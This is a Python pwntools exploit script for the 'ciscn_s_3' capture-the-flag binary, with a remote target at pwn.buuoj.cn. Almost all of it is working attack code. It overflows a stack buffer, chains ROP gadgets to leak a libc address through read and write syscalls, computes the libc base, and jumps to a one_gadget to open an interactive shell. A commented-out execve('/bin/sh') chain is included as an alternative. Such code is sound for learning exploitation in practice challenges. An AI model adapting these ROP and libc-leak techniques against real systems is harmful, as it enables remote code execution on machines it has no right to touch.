from pwn import *
from time import *
context.binary = './ciscn_s_3'
context.log_level = 'debug'
context.timeout = None
elf = context.binary



def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20154)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_s_3')
	#gdb.attach(p, 'b* 0x400517')
	dbg()

__libc_start_main_got = elf.got['__libc_start_main']
syscall = 0x400517 			#syscall; ret
pop_rdi = 0x4005a3			#pop rdi; ret
pop_rsi = 0x4005a1			#pop rsi,; pop r15; ret

main = 0x40051D
fake_call = 0x4004E1
data = 0x601020

mov_eax_0 = 0x400425 		#mov eax, 0; pop rbp, ret
mov_eax_f = 0x4004DA 		#mov eax, 0xf; ret
mov_eax_3b = 0x4004e2		#mov eax, 0x3b; ret

rop_init = 0x40059a
mov_call = 0x400580
def rop_chain(rdi, rsi, rdx, dono):
	rop = p64(rop_init)
	rop += p64(0) + p64(1)
	rop += p64(dono) + p64(rdx) + p64(rsi) + p64(rdi)
	rop += p64(mov_call)
	rop += p64(0) * 7

	return rop


payload = 'a'*0x10
payload += p64(mov_eax_0) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(data) + p64(1)
payload += p64(syscall)						# rax = read(0, data, 0x30)

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(__libc_start_main_got) + p64(1)
payload += p64(syscall)							#write(1, ___libc_start_main_got, rdx)
payload += p64(main)

p.send(payload)


sleep(1)
p.send('a')										#rax = 1

__libc_start_main_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']
binsh = libc_base + next(libc.search('/bin/sh\x00'))
one_gadget = libc_base + 0x45216
print "libc_base ==> " + hex(libc_base)
"""
payload = 'a'*0x10
payload += p64(mov_eax_f)
payload += p64(syscall)							#rt_rigreturn

payload += p64(mov_eax_3b)
payload += p64(pop_rdi) + p64(binsh)				
payload += p64(pop_rsi) + p64(0) + p64(0)
payload += p64(syscall)							#execve("/bin/sh", 0, 0)
p.send(payload)

"""

payload = 'a'*0x10
payload += p64(mov_eax_0) + p64(0)
payload += p64(one_gadget)
p.send(payload)

p.interactive()
p.close()
